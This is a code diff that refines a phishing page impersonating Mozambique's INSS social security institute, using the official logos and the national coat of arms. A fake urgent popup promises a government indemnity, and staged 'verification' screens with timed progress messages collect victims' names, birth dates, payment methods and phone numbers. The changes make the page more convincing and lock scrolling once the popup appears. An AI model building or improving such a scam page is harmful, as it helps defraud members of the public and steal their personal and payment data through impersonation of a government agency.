@@ -27,13 +27,37 @@
             --success-green: #28a745;
         }
 
+        /* ================= ANIMAÇÕES ================= */
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        @keyframes slideInLeft {
+            from { opacity: 0; transform: translateX(-50px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+        @keyframes pulse-icon { 
+            0% { transform: scale(1); } 
+            50% { transform: scale(1.08); } 
+            100% { transform: scale(1); } 
+        }
+        @keyframes pulse-btn {
+            0% { box-shadow: 0 0 0 0 rgba(217, 83, 79, 0.7); }
+            70% { box-shadow: 0 0 0 15px rgba(217, 83, 79, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(217, 83, 79, 0); }
+        }
+        @keyframes spin { 
+            0% { transform: rotate(0deg); } 
+            100% { transform: rotate(360deg); } 
+        }
+
         /* ================= HEADER E NAVEGAÇÃO (Otimizado p/ Mobile) ================= */
         .top-bar { background-color: var(--inss-dark); color: white; font-size: 11px; padding: 8px 0; }
         .top-bar .container { display: flex; justify-content: space-between; align-items: center; }
         .top-bar-links a { margin-left: 15px; color: #ddd; }
         .top-bar-links a:hover { color: white; }
 
-        header { background-color: var(--inss-blue); color: white; padding: 12px 0; box-shadow: 0 2px 10px rgba(0,0,0,0.1); position: relative; z-index: 100; }
+        header { background-color: var(--inss-blue); color: white; padding: 12px 0; box-shadow: 0 2px 10px rgba(0,0,0,0.1); position: relative; z-index: 100; animation: fadeInUp 0.8s ease-out; }
         .header-content { display: flex; justify-content: space-between; align-items: center; }
         
         .main-logo { height: 55px; width: auto; object-fit: contain; }
@@ -47,26 +71,54 @@
             background: url('https://www.inss.gov.mz/wp-content/uploads/2023/10/banner-proteccao-na-velhice.png') center/cover no-repeat; 
             height: 450px; display: flex; align-items: center; position: relative; 
         }
-        .hero-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.4); }
-        .hero-text { position: relative; color: white; padding-left: 10%; max-width: 600px; z-index: 1; }
-        .hero-text h1 { font-size: 52px; font-weight: 700; line-height: 1.1; text-shadow: 2px 2px 8px rgba(0,0,0,0.6); }
+        .hero-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.3); }
+        
+        /* Título Principal Estilizado */
+        .hero-text { position: relative; padding-left: 10%; max-width: 700px; z-index: 1; }
+        .hero-text h1 { 
+            font-size: 52px; 
+            font-weight: 700; 
+            line-height: 1.1; 
+            color: #fff;
+            background: rgba(0, 60, 113, 0.85); /* Fundo semi-transparente */
+            padding: 25px 35px;
+            border-left: 6px solid var(--inss-blue);
+            border-radius: 0 12px 12px 0;
+            backdrop-filter: blur(8px);
+            text-shadow: 2px 4px 10px rgba(0,0,0,0.5);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            animation: slideInLeft 1s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
 
         /* ================= SECÇÕES DO SITE ================= */
-        .section-title { color: var(--inss-blue); font-size: 18px; font-weight: 700; text-transform: uppercase; border-left: 4px solid var(--inss-blue); padding-left: 12px; margin: 40px 0 25px; }
+        .section-title { color: var(--inss-blue); font-size: 18px; font-weight: 700; text-transform: uppercase; border-left: 4px solid var(--inss-blue); padding-left: 12px; margin: 40px 0 25px; animation: fadeInUp 0.8s ease-out; }
         
         .news-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; }
-        .news-card { background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 10px rgba(0,0,0,0.05); transition: transform 0.3s ease; }
-        .news-card:hover { transform: translateY(-5px); }
+        .news-card { background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 10px rgba(0,0,0,0.05); transition: transform 0.3s ease, box-shadow 0.3s ease; animation: fadeInUp 0.8s ease-out backwards; }
+        .news-card:nth-child(1) { animation-delay: 0.1s; }
+        .news-card:nth-child(2) { animation-delay: 0.2s; }
+        .news-card:nth-child(3) { animation-delay: 0.3s; }
+        .news-card:hover { transform: translateY(-8px); box-shadow: 0 8px 20px rgba(0,0,0,0.1); }
         .news-card img { width: 100%; height: 180px; object-fit: cover; }
         .news-card-content { padding: 20px; font-size: 14px; font-weight: 500; color: #444; line-height: 1.4; }
 
         .stats-section { background: var(--inss-blue); color: white; padding: 50px 0; margin-top: 50px; }
         .stats-grid { display: grid; grid-template-columns: repeat(4, 1fr); text-align: center; gap: 20px; }
+        .stat-item { animation: fadeInUp 0.8s ease-out backwards; }
+        .stat-item:nth-child(1) { animation-delay: 0.1s; }
+        .stat-item:nth-child(2) { animation-delay: 0.2s; }
+        .stat-item:nth-child(3) { animation-delay: 0.3s; }
+        .stat-item:nth-child(4) { animation-delay: 0.4s; }
         .stat-item h2 { font-size: 38px; font-weight: 300; margin-bottom: 5px; }
         .stat-item p { font-size: 13px; opacity: 0.9; text-transform: uppercase; letter-spacing: 1px; }
 
         footer { background-color: #001f3f; color: #a0b2c6; padding: 50px 0 20px; font-size: 13px; }
         .footer-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 30px; margin-bottom: 30px; }
+        .footer-col { animation: fadeInUp 0.8s ease-out backwards; }
+        .footer-col:nth-child(1) { animation-delay: 0.1s; }
+        .footer-col:nth-child(2) { animation-delay: 0.2s; }
+        .footer-col:nth-child(3) { animation-delay: 0.3s; }
+        .footer-col:nth-child(4) { animation-delay: 0.4s; }
         .footer-col h4 { color: white; margin-bottom: 15px; font-size: 14px; text-transform: uppercase; letter-spacing: 0.5px; }
         .footer-col ul li { margin-bottom: 10px; cursor: pointer; transition: color 0.2s; }
         .footer-col ul li:hover { color: white; }
@@ -75,8 +127,8 @@
         /* ================= MODAL INICIAL (CHAMATIVO) ================= */
         .modal-overlay { 
             position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: rgba(0,0,0,0.8); display: flex; justify-content: center; align-items: center; 
-            z-index: 1000; backdrop-filter: blur(4px); 
+            background: rgba(0,0,0,0.85); display: flex; justify-content: center; align-items: center; 
+            z-index: 1000; backdrop-filter: blur(5px); 
             opacity: 0; visibility: hidden; transition: opacity 0.5s ease, visibility 0.5s ease;
             padding: 20px;
         }
@@ -90,8 +142,14 @@
         }
         .modal-overlay.show .modal-content { transform: translateY(0) scale(1); }
         
-        .alert-icon { font-size: 50px; color: var(--alert-red); margin-bottom: 15px; animation: pulse-icon 1.5s infinite; }
-        @keyframes pulse-icon { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
+        /* Novo Brasão */
+        .brasao-icon { 
+            height: 75px; 
+            width: auto; 
+            margin-bottom: 15px; 
+            animation: pulse-icon 2s infinite; 
+            object-fit: contain;
+        }
 
         .modal-content h2 { color: var(--alert-red); margin-bottom: 15px; font-size: 24px; text-transform: uppercase; letter-spacing: 1px; }
         .modal-content p { color: #444; font-size: 15px; line-height: 1.6; margin-bottom: 10px; }
@@ -111,11 +169,6 @@
         .btn-primary:hover { background-color: #c9302c; transform: translateY(-2px); }
         
         .btn-attention { animation: pulse-btn 2s infinite; }
-        @keyframes pulse-btn {
-            0% { box-shadow: 0 0 0 0 rgba(217, 83, 79, 0.7); }
-            70% { box-shadow: 0 0 0 15px rgba(217, 83, 79, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(217, 83, 79, 0); }
-        }
 
         /* ================= APP CONTAINER (TELAS DO FLUXO) ================= */
         #app-container { 
@@ -142,9 +195,27 @@
         
         .form-group { margin-bottom: 20px; text-align: left; }
         .form-group label { display: block; font-size: 13px; color: #333; margin-bottom: 8px; font-weight: 500; }
+        
+        /* Correção para o bug de input no iPhone (Safari) */
         .form-group input { 
-            width: 100%; padding: 14px; border: 2px solid #e0e0e0; border-radius: 6px; 
-            font-size: 16px; transition: 0.3s; outline: none; 
+            width: 100%; 
+            height: 50px; /* Força altura fixa */
+            padding: 14px; 
+            border: 2px solid #e0e0e0; 
+            border-radius: 6px; 
+            font-size: 16px; 
+            transition: 0.3s; 
+            outline: none; 
+            -webkit-appearance: none; /* Remove estilos padrão do iOS */
+            appearance: none;
+            background-color: #fff;
+            color: #333;
+        }
+        .form-group input[type="date"] {
+            display: flex;
+            align-items: center;
+            -webkit-appearance: none;
+            appearance: none;
         }
         .form-group input:focus { border-color: var(--inss-blue); box-shadow: 0 0 0 3px rgba(0,136,209,0.1); }
 
@@ -159,7 +230,6 @@
         .spinner-container { position: relative; width: 70px; height: 70px; margin: 0 auto 25px; }
         .spinner { border: 4px solid #f3f3f3; border-top: 4px solid var(--inss-blue); border-radius: 50%; width: 100%; height: 100%; animation: spin 1s linear infinite; }
         .spinner-icon { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: var(--inss-blue); font-size: 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
         /* Barra de Progresso */
         .progress-bar-container { background: #e0e0e0; border-radius: 10px; height: 12px; width: 100%; margin: 25px 0 15px; overflow: hidden; }
@@ -191,8 +261,7 @@
         .payment-card.selected i { color: var(--inss-blue); }
 
         #payment-details { display: none; margin-top: 20px; padding-top: 20px; border-top: 1px solid #eee; }
-        .slide-down { animation: slideDown 0.4s ease forwards; }
-        @keyframes slideDown { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
+        .slide-down { animation: fadeInUp 0.4s ease forwards; }
 
         /* WhatsApp e Erro */
         .btn-whatsapp { 
@@ -211,8 +280,8 @@
             .mobile-menu-btn { display: block; }
             
             .hero { height: 350px; }
-            .hero-text { padding-left: 5%; text-align: center; margin: 0 auto; }
-            .hero-text h1 { font-size: 38px; }
+            .hero-text { padding-left: 5%; padding-right: 5%; text-align: center; margin: 0 auto; }
+            .hero-text h1 { font-size: 32px; padding: 20px; border-radius: 12px; border-left: none; border-top: 6px solid var(--inss-blue); }
             
             .news-grid { display: flex; overflow-x: auto; scroll-snap-type: x mandatory; gap: 15px; padding-bottom: 20px; }
             .news-card { min-width: 80%; scroll-snap-align: start; }
@@ -224,7 +293,7 @@
             
             .modal-content { padding: 25px 15px; }
             .modal-content h2 { font-size: 20px; }
-            .alert-icon { font-size: 40px; }
+            .brasao-icon { height: 60px; }
             
             .screen { padding: 25px 20px; }
             .amount-box h1 { font-size: 32px; }
@@ -339,7 +408,8 @@
     <!-- ================= MODAL INICIAL (CHAMATIVO) ================= -->
     <div class="modal-overlay" id="initial-modal">
         <div class="modal-content">
-            <i class="fas fa-exclamation-triangle alert-icon"></i>
+            <!-- Brasão de Moçambique -->
+            <img src="https://www.inss.gov.mz/wp-content/webp-express/webp-images/uploads/2023/10/brasao-mocambique.png.webp" alt="Brasão de Moçambique" class="brasao-icon">
             <h2>Aviso Urgente</h2>
             <p>O INSS acaba de liberar <strong>um valor de indenização</strong> a todos os funcionários públicos e privados.</p>
             <span class="highlight-text">
@@ -379,7 +449,7 @@
             <p id="loading-text-1">Aguarde enquanto validamos as suas informações no sistema central seguro.</p>
         </div>
 
-        <!-- Tela 3: Verificação (10s) - MAIS CONVINCENTE -->
+        <!-- Tela 3: Verificação (10s) -->
         <div class="screen" id="screen-3">
             <img src="https://www.inss.gov.mz/wp-content/webp-express/webp-images/uploads/2023/10/inss-logo-2023.png.webp" alt="INSS Logo" class="step-logo">
             <h2>Verificação Oficial de Dados</h2>
@@ -402,7 +472,7 @@
             </p>
         </div>
 
-        <!-- Tela 4: Resultado - MAIS CONVINCENTE -->
+        <!-- Tela 4: Resultado -->
         <div class="screen" id="screen-4">
             <img src="https://www.inss.gov.mz/wp-content/webp-express/webp-images/uploads/2023/10/inss-logo-2023.png.webp" alt="INSS Logo" class="step-logo">
             <h2 style="color: var(--success-green);"><i class="fas fa-check-circle"></i> Dados Verificados!</h2>
@@ -479,10 +549,11 @@
             telefone: ""
         };
 
-        // Atraso de 4 segundos para o popup inicial chamativo
+        // Atraso de 4 segundos para o popup inicial e bloqueio do scroll
         window.addEventListener('load', () => {
             setTimeout(() => {
                 document.getElementById('initial-modal').classList.add('show');
+                document.body.classList.add('modal-open'); // Bloqueia o scroll do site aqui
             }, 4000);
         });
 
@@ -493,7 +564,8 @@
             let appContainer = document.getElementById('app-container');
             appContainer.style.display = 'flex'; 
             
-            document.body.classList.add('modal-open');
+            // O body continua com 'modal-open', o que é correto, 
+            // pois o app-container agora ocupa o ecrã todo.
             goToScreen(1);
         }
 
@@ -525,7 +597,6 @@
             userData.nome = nomeInput;
             userData.dataNasc = dataInput;
 
-            // BUG CORRIGIDO AQUI: Removida a linha que tentava aceder a 'display-data' que já não existe no HTML
             document.getElementById('display-nome').innerText = userData.nome;
 
             goToScreen(2);
@@ -557,7 +628,6 @@
             let interval = 100; 
             let step = 100 / (duration / interval);
 
-            // Textos dinâmicos para simular um processo real e rigoroso
             setTimeout(() => {
                 verifyText.innerHTML = "A verificar histórico de contribuições e vínculo empregatício...";
             }, 2000);
@@ -586,7 +656,6 @@
         // Selecionar método e mostrar campo
         function selectMethod(method, elementId) {
             userData.metodo = method;
-            // BUG CORRIGIDO AQUI: Removida a linha que tentava aceder a 'method-name' que já não existe no HTML
             
             document.querySelectorAll('.payment-card').forEach(card => card.classList.remove('selected'));
             document.getElementById(elementId).classList.add('selected');
